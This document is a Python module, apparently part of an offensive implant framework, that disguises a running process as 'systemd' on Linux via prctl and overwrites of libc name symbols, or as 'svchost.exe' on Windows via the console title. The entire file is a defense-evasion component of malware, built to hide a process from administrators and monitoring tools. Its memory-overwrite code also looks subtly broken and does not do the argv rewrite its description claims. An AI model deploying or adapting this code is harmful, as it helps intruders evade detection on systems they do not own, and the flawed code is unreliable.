"""
@module: masquerade
@desc: 进程伪装（Linux: prctl comm + __progname/program_invocation_name + argv 原地改写；Windows: 控制台标题）
"""
import ctypes
import os
import subprocess

MODULE = {
    "desc": "进程伪装（Linux: prctl + argv 改写 / Windows: 控制台标题）",
    "params": [("new_name", "Default: systemd (Linux) / svchost.exe (Windows)")],
}


def run(new_name=""):
    if os.name == "nt":
        n = new_name or "svchost.exe"
        try:
            subprocess.run(
                ["powershell", "-NoProfile", "-Command", f"$Host.UI.RawUI.WindowTitle='{n}'"],
                timeout=10, capture_output=True)
        except Exception:
            pass
        return f"(masquerade: WindowTitle -> {n})"
    n = new_name or "systemd"
    try:
        try:
            libc = ctypes.CDLL("libc.so.6")
        except Exception:
            libc = ctypes.CDLL(None)

        libc.prctl.argtypes = [ctypes.c_int, ctypes.c_char_p, ctypes.c_ulong, ctypes.c_ulong, ctypes.c_ulong]
        libc.prctl(15, n.encode('utf-8')[:15], 0, 0, 0)
        try:
            libc.free.argtypes = []
            new_title = n.encode('utf-8')
            argv_ptr = ctypes.c_char_p.in_dll(libc, "__progname")
            ctypes.memset(argv_ptr, 0, len(argv_ptr.value or b""))
            ctypes.memmove(argv_ptr, new_title, min(len(new_title), 15))
            try:
                argv_full = ctypes.c_char_p.in_dll(libc, "program_invocation_name")
                ctypes.memset(argv_full, 0, len(argv_full.value or b""))
                ctypes.memmove(argv_full, new_title, len(new_title))
            except Exception:
                pass
        except Exception:
            pass

        return f"(masquerade: title -> {n})"
    except Exception as e:
        return f"(masquerade failed: {e})"
